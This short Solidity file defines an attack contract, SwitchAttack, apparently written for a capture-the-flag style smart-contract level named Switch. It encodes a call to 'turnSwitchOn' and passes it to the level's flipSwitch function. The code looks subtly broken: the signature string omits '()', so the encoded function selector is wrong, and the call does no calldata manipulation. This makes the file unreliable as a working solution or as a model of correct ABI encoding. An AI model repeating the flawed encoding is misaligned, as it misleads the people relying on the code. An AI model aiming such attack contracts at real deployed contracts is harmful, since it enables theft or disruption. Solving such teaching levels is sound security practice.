// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../levels/Switch.sol";

contract SwitchAttack{
    function att(address addr) public {
        bytes memory data = abi.encodeWithSignature("turnSwitchOn");
        Switch(addr).flipSwitch(data);
    }
}